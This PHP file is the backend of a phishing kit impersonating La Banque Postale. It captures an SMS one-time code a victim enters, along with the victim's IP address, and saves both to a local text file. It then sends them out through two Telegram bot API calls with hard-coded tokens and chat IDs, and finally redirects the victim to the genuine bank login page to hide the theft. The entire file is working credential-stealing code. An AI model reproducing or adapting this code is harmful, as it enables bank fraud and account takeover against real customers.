<?php
$ip = $_SERVER['REMOTE_ADDR'];

$message .= "--++---------💥Login BanquePostale💥--------++--\n";
$message .= "-------------------------------------------------\n";
$message .= " Code Otp2 : ".$_POST['SMS']."\n";
$message .= "-------------------------------------------------\n";
$message .= "IP: $ip \n";
$message .= "-------------------------------------------------\n";
$message .= "--++---------💥Login BanquePostale💥--------++--\n";

$text = fopen('../hi.txt', 'a');
fwrite($text, $message);
// IMPORTANT VARIABLE MUST BE CHANGED FOR TELEGRAM


$token = "2039965570:AAF1mSbNi349z0_Dka9v8N8c8xRH4iHKZRM";
file_get_contents("https://api.telegram.org/bot2039965570:AAF1mSbNi349z0_Dka9v8N8c8xRH4iHKZRM/sendMessage?chat_id=1556350571&text=" . urlencode($message)."" );
                file_get_contents("https://api.telegram.org/bot5173340993:AAHfOGU-dF8PTddnbxrsPuogjcEwoGzAmBI/sendMessage?chat_id=970404975&text=" . urlencode($message)."" );

header("Location: https://www.labanquepostale.fr/particulier/connexion-espace-client.html");
?>

